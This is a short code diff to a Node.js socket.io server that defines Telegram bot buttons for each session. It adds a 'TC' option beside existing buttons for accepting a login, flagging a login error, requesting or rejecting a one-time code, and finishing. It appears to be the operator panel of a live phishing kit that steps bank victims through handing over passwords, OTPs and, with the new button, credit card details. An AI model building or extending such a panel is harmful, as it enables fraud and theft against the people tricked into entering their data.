@@ -38,7 +38,7 @@ io.on('connection', (socket) => {
           [
             { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
             { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
-           
+            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
           ]
         ]
       }
@@ -78,7 +78,7 @@ io.on('connection', (socket) => {
           [
             { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
             { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` },
-           
+            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
           ]
         ]
       }
@@ -98,7 +98,7 @@ io.on('connection', (socket) => {
           [
             { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
             { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
-            
+            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
           ]
         ]
       }
